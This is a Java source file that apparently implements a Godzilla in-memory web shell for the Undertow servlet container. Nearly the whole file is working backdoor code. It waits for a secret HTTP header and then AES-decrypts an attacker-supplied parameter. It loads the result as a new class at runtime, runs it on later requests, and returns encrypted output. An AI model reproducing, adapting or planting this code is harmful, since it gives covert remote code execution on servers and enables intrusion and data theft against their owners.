package com.reajason.javaweb.memshell.shelltool.godzilla;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;

/**
 * @author ReaJason
 */
public class GodzillaUndertowServletHandler extends ClassLoader {
    private static String key;
    private static String pass;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    public GodzillaUndertowServletHandler() {
    }

    public GodzillaUndertowServletHandler(ClassLoader z) {
        super(z);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        try {
            Object servletRequestContext = null;
            if (args.length == 2) {
                servletRequestContext = args[1];
            } else {
                servletRequestContext = args[2];
            }
            Object request = servletRequestContext.getClass().getMethod("getServletRequest").invoke(servletRequestContext);
            Object response = servletRequestContext.getClass().getMethod("getServletResponse").invoke(servletRequestContext);
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                try {
                    String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                    byte[] data = base64Decode(parameter);
                    data = this.x(data, false);
                    if (payload == null) {
                        payload = new GodzillaUndertowServletHandler(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
                    } else {
                        request.getClass().getMethod("setAttribute", String.class, Object.class).invoke(request, "parameters", data);
                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                        Object f = payload.newInstance();
                        f.equals(arrOut);
                        f.equals(request);
                        f.equals(data);
                        f.toString();
                        writer.write(md5.substring(0, 16));
                        writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                        writer.write(md5.substring(16));
                    }
                } catch (Throwable e) {
                    e.printStackTrace();
                    writer.write(getErrorMessage(e));
                }
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}